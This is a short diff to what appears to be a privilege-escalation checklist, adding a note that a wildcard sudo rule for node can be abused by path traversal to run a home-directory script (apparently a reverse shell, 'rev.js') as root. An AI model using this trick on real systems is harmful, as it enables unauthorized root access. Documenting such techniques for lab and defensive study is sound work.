@@ -22,9 +22,10 @@ users
 
 **What commands can the user execute with sudo?
 `sudo -l
-
 look for wildcards to run anything or try path traversal
-``
+`(ALL) /usr/bin/node /usr/local/scripts/*.js`
+means this will work:
+`sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/rev.js`
 
 **What is the kernel version and architecture type?
 `uname -a
